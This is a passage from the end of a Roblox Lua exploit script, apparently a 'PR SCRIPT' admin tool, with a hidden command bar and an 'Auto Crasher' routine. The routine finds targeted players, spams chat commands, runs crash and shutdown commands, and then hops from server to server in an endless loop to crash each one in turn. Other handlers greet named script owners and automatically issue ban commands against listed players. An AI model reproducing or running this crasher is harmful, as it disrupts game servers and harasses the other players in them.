dairyQueenBalls.Font = Enum.Font.Roboto
dairyQueenBalls.Text = "]"
dairyQueenBalls.TextColor3 = Color3.fromRGB(255, 255, 255)
dairyQueenBalls.TextSize = 75.000
dairyQueenBalls.TextStrokeTransparency = 0.000
dairyQueenBalls.TextWrapped = true
holyshidt11.Name = "holyshidt11"
holyshidt11.Parent = dairyQueenBalls
holyshidt11.AnchorPoint = Vector2.new(1, 0)
holyshidt11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
holyshidt11.BackgroundTransparency = 0.750
holyshidt11.BorderSizePixel = 5
holyshidt11.BorderMode = "Inset"
holyshidt11.Size = UDim2.new(0, 0, 0, 61)
holyshidt11.Visible = false
holyshidt11.Font = Enum.Font.Code
holyshidt11.Text = ""
holyshidt11.AutomaticSize="X"
holyshidt11.TextColor3 = Color3.fromRGB(255, 255, 255)
holyshidt11.TextSize = 50.000
holyshidt11.TextStrokeTransparency = 0.000
holyshidt11.TextXAlignment = Enum.TextXAlignment.Right
--local actextbox=holyshidt11:Clone()

	function openUI()
	    isCmdBarOpen=true
	    togglegarbage41923812=true
		holyshidt11:CaptureFocus()
		holyshidt11.Visible=true
		game:GetService("TweenService"):Create(holyshidt11,TweenInfo.new(1,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut,0,false,0),{Size=UDim2.new(0,200,0,61)}):Play()
		game:GetService("RunService").RenderStepped:Wait()
		holyshidt11.Text=""
	end
	
	Connections[tostring(math.random(-9999999,9999999))] = game:GetService("UserInputService").InputBegan:Connect(function(key,gp)
	if not gp then
	if key.KeyCode==Enum.KeyCode.RightBracket then
	openUI()
	end
	else
	    if key.KeyCode==Enum.KeyCode.Tab then
	        if #holyshidt11.Text:split(" ")==1 then
    	    local s,f=pcall(function()
    	    local text=holyshidt11.Text
    	    game:GetService("RunService").RenderStepped:Wait()
    	    holyshidt11.Text=getCommand(text)[1][1]
    	    holyshidt11.CursorPosition=#holyshidt11.Text+1
	        end)
	        else
	            local s,f=pcall(function()
        	    local text=holyshidt11.Text
        	    local message = ""
                for i=1, #text:split(" ") do
                    if i ~= #text:split(" ") then
                        message = message.." "..text:split(" ")[i]
                    end
                end
                message=message:sub(2,#message)
                local player = GetPlayers(text:split(" ")[#text:split(" ")])
                player=player[1]
        	    game:GetService("RunService").RenderStepped:Wait()
        	    holyshidt11.Text=message.." "..player.Name
        	    holyshidt11.CursorPosition=#holyshidt11.Text+1
    	        end)
	        end
	end
	end
	end)
	Connections[tostring(math.random(-9999999,9999999))] = game:GetService("RunService").RenderStepped:Connect(function()
	    if UI.dairyQueenBalls.holyshidt11.Size == UDim2.new(0,0,0,61) then
            UI.dairyQueenBalls.holyshidt11.Visible=false
        else
            UI.dairyQueenBalls.holyshidt11.Visible=true
        end
	end)
	Connections[tostring(math.random(-9999999,9999999))] = dairyQueenBalls.MouseButton1Click:Connect(openUI)
	Connections[tostring(math.random(-9999999,9999999))] = holyshidt11.FocusLost:Connect(function(shouldSend)
	spawn(function()
	        isCmdBarOpen=false
			game:GetService("TweenService"):Create(holyshidt11,TweenInfo.new(1,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut,0,false,0),{Size=UDim2.new(0,0,0,61)}):Play()
			holyshidt11.Text=""
	end)
		if shouldSend then
			local BM = holyshidt11.Text:split(" ")
				local commandname = BM[1]:lower()
				if string.sub(commandname,0,#prefix) ~= prefix then commandname=prefix..commandname end
				local t = ""
				table.remove(BM,1)
				local findargs = {}
				for i,v in pairs(BM) do
					table.insert(findargs,v)
					t=t..v.." "
				end
				spawn(function()runCommand(commandname,findargs)end)
if consoleOn then print("running command: "..commandname.." "..t)end
		end
	end)
end)

task.spawn(function()
	if Settings["Auto Crasher"]["Enabled"] then
		local WhitelistedFound = false
		if not (Settings["Auto Crasher"]["Targetted Players"]["Enabled"] and Settings["Auto Crasher"]["Targetted Players"]["Ignore Whitelisted"]) then
			print("Ignore whitelisted is OFF")
			for i,v in pairs(game.Players:GetPlayers()) do
				if table.find(Settings["Auto Crasher"]["Whitelisted Players"],v.Name) then
					WhitelistedFound = true
					GUI:SendMessage(ScriptName, "Whitelisted player ("..v.DisplayName..") found, skipping server.")
				end
			end
		end
		if not WhitelistedFound then
			if Settings["Auto Crasher"]["Targetted Players"]["Enabled"] then
				print("ok les go")
				local TargettedFound = false
				for i,v in pairs(game.Players:GetPlayers()) do
					if table.find(Settings["Auto Crasher"]["Targetted Players"]["Players"],v.Name) then
						TargettedFound = true
					end
				end
				if not TargettedFound then
					GUI:SendMessage(ScriptName, "Targetted players not found, skipping server.")
				else
					if Settings["Auto Crasher"]["Message"] then
						GUI:SendMessage(ScriptName, Settings["Auto Crasher"]["Message"])
					end
					for i,v in pairs(Settings["Auto Crasher"]["Commands"]) do
						game.Players:Chat(v)
						if Settings["Auto Crasher"]["Command Delay"] ~= -1 then
							wait(Settings["Auto Crasher"]["Command Delay"])
						end
					end
					if Settings["Auto Crasher"]["Time Before Crash"] ~= -1 then
						wait(Settings["Auto Crasher"]["Time Before Crash"])
					end
					if Settings["Auto Crasher"]["Crash"] then
						if Settings["Auto Crasher"]["Sil"] then
							runCommand("bye xd",{})
						else
							runCommand(prefix.."shutdown",{})
						end
					end
				end
			else
				print("ok les no")
				if Settings["Auto Crasher"]["Message"] then
					GUI:SendMessage(ScriptName, Settings["Auto Crasher"]["Message"])
				end
				for i,v in pairs(Settings["Auto Crasher"]["Commands"]) do
					game.Players:Chat(v)
					if Settings["Auto Crasher"]["Command Delay"] ~= -1 then
						wait(Settings["Auto Crasher"]["Command Delay"])
					end
				end
				if Settings["Auto Crasher"]["Time Before Crash"] ~= -1 then
					wait(Settings["Auto Crasher"]["Time Before Crash"])
				end
				if Settings["Auto Crasher"]["Crash"] then
					if Settings["Auto Crasher"]["Sil"] then
						runCommand("bye xd",{})
					else
						runCommand("bye xd",{})
					end
				end
			end
		end
		while true do
			wait(Settings["Auto Crasher"]["Serverhop Time"])
			if Settings["Auto Crasher"]["Targetted Players"]["Enabled"] and Settings["Auto Crasher"]["Targetted Players"]["Use Join Player"] then
				runCommand(prefix.."joinplayer",{Settings["Auto Crasher"]["Targetted Players"]["Players"][math.random(1,#Settings["Auto Crasher"]["Targetted Players"]["Players"])],"silent"})
			else
				if Settings["Auto Crasher"]["Skip Crashed Servers"] then
					runCommand(prefix.."savehop",{})
				else
					runCommand(prefix.."serverhop",{})
				end
			end
		end
	else
		GUI:SendMessage(ScriptName, Settings["Welcome Message"])
	end
end)

game.Players.PlayerAdded:Connect(function(player)
	if player.Name == "feistve" then
	wait(5)
		game.Players:Chat("h Ew Aria is Here (PR SCRIPT)")
	end
end)

game.Players.PlayerAdded:Connect(function(player)
    if player.Name == "atprog" then
       wait(1)
        game.Players:Chat("clr")
        game.Players:Chat("h/ATPROG IS HERE (PR SCRIPT OWNER)")
    end
end)

game.Players.PlayerAdded:Connect(function(player)
    if player.Name == "PislickE4ver7" then
       wait(1)
        game.Players:Chat("clr")
        game.Players:Chat("h PislickE4ver7 IS HERE (PR SCRIPT OWNER)")
    end
end)

game.Players.PlayerAdded:Connect(function(player)
if table.find(Toolbans,player.Name) then
game.Players:Chat(".gb " ..player.Name)
end
end)

print("Loaded in "..tostring(os.clock()-loadtime).."s / "..tostring(math.floor((os.clock()-loadtime)*1000)).."ms")
